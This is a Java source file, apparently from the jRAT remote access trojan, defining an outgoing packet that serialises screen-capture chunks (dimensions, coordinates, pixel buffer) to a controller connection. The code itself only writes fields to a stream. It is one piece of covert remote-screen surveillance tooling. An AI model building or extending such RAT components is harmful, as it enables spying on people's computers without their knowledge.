package jrat.client.packets.outgoing;

import jrat.client.Connection;

public class Packet26RemoteScreen implements OutgoingPacket {

	private int chunkWidth;
	private int chunkHeight;
	private int x;
	private int y;
	private int width;
	private int height;
	private byte[] buffer;

	public Packet26RemoteScreen(int w, int h, int x, int y, int width, int height, byte[] buffer) {
		this.chunkWidth = w;
		this.chunkHeight = h;
		this.x = x;
		this.y = y;
		this.width = width;
		this.height = height;
		this.buffer = buffer;
	}

	@Override
	public void write(Connection con) throws Exception {
		con.writeInt(chunkWidth);
		con.writeInt(chunkHeight);
		con.writeInt(x);
		con.writeInt(y);
		con.writeInt(width);
		con.writeInt(height);

		con.writeInt(buffer.length);
		con.write(buffer);
	}

	@Override
	public short getPacketId() {
		return 26;
	}

}
